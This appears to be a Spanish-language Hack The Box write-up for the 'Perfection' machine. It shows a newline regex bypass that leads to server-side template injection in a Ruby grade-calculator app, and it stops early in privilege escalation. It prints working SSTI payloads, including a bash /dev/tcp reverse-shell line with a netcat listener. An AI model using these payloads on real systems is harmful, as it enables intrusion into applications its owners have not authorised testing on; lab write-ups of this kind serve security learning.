#by d4l1

<h1 align="center">Perfection</h1>

<p align="center"><img  src="https://github.com/D4l1-web/HTB/assets/79869523/fc054059-74b6-4363-bb86-72efafd10b9f"></p>

# INTRODUCCIÓN

Perfection es una maquina Linux fácil, en la que contiene una aplicacion web con la funcion de poder calcular notas de estudiantes. La aplicacion web es vulnerable a (SSTI) via regex.

## ENUMERACIÓN

Bienvenidos a esta máquina. Como siempre haremos los dos comandos básicos, comprobar que tenemos conexión y el escaner de puertos.

![image](https://github.com/D4l1-web/HTB/assets/79869523/7e0bd8ef-0907-49d5-b55a-1a110fec0663)

Posteriormente haremos el escaner a ver que encontramos.

![image](https://github.com/D4l1-web/HTB/assets/79869523/1d590945-d1bf-4065-917b-68ae3af286a1)

Como podemos comprobar nos encontramos con dos puertos abiertos el 22 (ssh) y el 80 (http) en un servidor ngnix .

Tenemos más información porque nos dan la versión de ssh.
![image](https://github.com/D4l1-web/HTB/assets/79869523/9059dbab-66b5-4f44-b7dd-5da9f3d85fa0)

### HTTP

Si nos conectamos al servidor web, veremos un "weighted grade calculator" una herramienta pa los alumnos vamos. 

![image](https://github.com/D4l1-web/HTB/assets/79869523/a90ff5e5-7bd4-45a7-85f7-b16a2221ee8f)

Encontramos dos cosas importantes el lenguaje de programación "Ruby" y el framework que utiliza "WEBrick 1.7.0"

![image](https://github.com/D4l1-web/HTB/assets/79869523/774a6134-463a-4047-9e35-48d4bdd6cc9e)

Si nos vamos a la tercera pestaña nos encontramos con una calculadora, vamos a intentar poner datos reales para que no nos de error.

![image](https://github.com/D4l1-web/HTB/assets/79869523/00a3c90b-584f-4750-8e5a-e337a279db22)

Como entenderemos, al tener un boton Sumbit damos por hecho que tiene que ir a algun lado. Con lo cual utilizaremos BurpSuite para pillar la request y ver donde va.

![image](https://github.com/D4l1-web/HTB/assets/79869523/c3f659e9-ccc8-46dd-a334-2d53eb258424)

Mandamos la request que tneemos al Repeater del burp suite. y modificamos la request para ver que respuestas tiene.

![image](https://github.com/D4l1-web/HTB/assets/79869523/46db20a1-dd28-44b4-bc26-6f362d82eec5)

La forma en que nos da el output nos infica que hay un uso de tema, abriendo una posibilidad de un (SSTI). Obviamente en Ruby, utilizaremos un payload muy común en Ruby <%= %> dentro del campo "Category"

![image](https://github.com/D4l1-web/HTB/assets/79869523/3061c4a6-cd47-4189-8cae-ccee74ce4d20)

Vemos que por aqui no.

Ruby tiene el operador  =~

```
irb(main):003:0> "SampleText" =~ /^[a-zA-Z]+$/
=> 0
```
Como vemos, la string "SampleText" bsuca maches de la a-z y en mayuscula.

Sin embargo si nosotros insertamos una nueva linea dentro del input con algun caracter que no machee reglex, como { y intentar ver como interactuar.
```
irb(main):004:0> "SampleText\n{{}}" =~ /^[a-zA-Z]+$/
=> 0
```
Con una nueva línea: 
```
irb(main):008:0> "SampleText{{}}" =~ /^[a-zA-Z]+$/
=> nil
```
Sabiendo esto tenemos un potencial bypsas de Ruby.
```
test
<%= IO.popen("sleep 10").readlines() %>
```
Este payload hace que el servidor ejecture un sleep 10 haciendo que la página se duerma 10 segundos, indicando que funciona correctamente.

Dentro de "repeater" modificamos la request interceptada para incluid nuestro payload dentro de la categoria 1 manualmente incluimos una nueva linea usando URL-encoding.

![image](https://github.com/D4l1-web/HTB/assets/79869523/f028c0c4-5c73-4829-a709-0d645ff09d29)

Como podemos comprobar la página web se duerme durante 10 segundos. Indicando que al injección funciona.

En caso de querer hacer una reverse shell, inyectaremos este payload.

```
Test1
<%= IO.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").readlines() %>
```
Mientras abrimos obviamente un netcat
```
nc- lvnp 4444
```
![image](https://github.com/D4l1-web/HTB/assets/79869523/6986c51f-cd6f-41dc-a477-cfc04fe44db8)

![image](https://github.com/D4l1-web/HTB/assets/79869523/a802f914-e67d-4c04-a63f-2550ddfbc25f)

Estamos dentro!!

Si queremos una shell mas estable, podemos ejecutar 
```
script /dev/null -c /bin/bash
```

![image](https://github.com/D4l1-web/HTB/assets/79869523/9f85626c-bdea-422c-892f-d80719eb1f1f)

# ESCALA DE PRIVILEGIOS

Primero de todo enumeraremos el sistema

![image](https://github.com/D4l1-web/HTB/assets/79869523/c507ba21-0558-44ed-b84d-7701fad6f07e)

Vemos que estamos dentro del usuario "susan" pero estamos dentro del grupo "sudo" (requiere contraseña) necesitamos encontrar esa contraseña.

## GRUPO SUDO

EL grupo sudo es crucial para los privilegios porque los miembros de este grupo puede ejecutar cualqueir comando que quieran.

Primero de todo enumeraremos a ver si tiene algo dentro de su email

```
ls -la /var/mail
```
Nos encontramos con un archivo vamos a verlo.

![image](https://github.com/D4l1-web/HTB/assets/79869523/5573e43e-ef44-4ba4-a88a-3dfbb8ee7770)






